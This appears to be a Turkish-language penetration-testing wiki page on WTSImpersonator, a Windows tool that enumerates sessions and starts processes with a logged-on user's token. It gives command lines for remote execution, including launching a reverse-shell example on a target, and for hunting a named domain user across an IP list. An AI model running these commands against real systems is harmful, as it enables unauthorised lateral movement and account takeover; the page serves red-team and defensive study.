# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, Omri Baso tarafından geliştirilmiştir; `\\pipe\LSM_API_service` RPC named pipe üzerinden sunulan Windows Terminal Services API'lerini kullanarak oturum açmış session'ları enumerate eder ve seçilen kullanıcının token'ı ile bir process başlatır. Local enumeration ve execution'ın yanı sıra remote service-based workflow'ları da destekler.<sup>[[1]](#references)</sup>

## Temel işlevsellik

Local execution flow aşağıdaki API sequence'ini kullanır:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Modüller ve kullanım

- **Kullanıcıları listeleme:** Araç, local veya remote host üzerindeki session'ları listeleyebilir.

- Locally:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotely, bir IP adresi veya hostname belirtin:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Komutları yürütme:** `exec` ve `exec-remote` modülleri bir service context gerektirir. Microsoft, `WTSQueryUserToken` işlevinin caller'ın `LocalSystem` olarak ve `SE_TCB_NAME` privilege ile çalışmasını gerektirdiğini belirtir.<sup>[[2]](#references)</sup>

- Local command execution:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec, testing amacıyla bir `LocalSystem` command prompt başlatabilir:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote command execution:** Remote mode, PsExec benzeri bir workflow ile target üzerinde bir service oluşturur ve bu nedenle söz konusu service'i install ve start etme rights gerektirir.<sup>[[1]](#references)</sup>

- Example:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User hunting:** `user-hunter` module, bir host listesinde adı belirtilen kullanıcının session'ını arar ve sağlanan programı bu context'te execute etmeyi dener.<sup>[[1]](#references)</sup>
- Usage example:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: `WTSQueryUserToken` işlevi](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
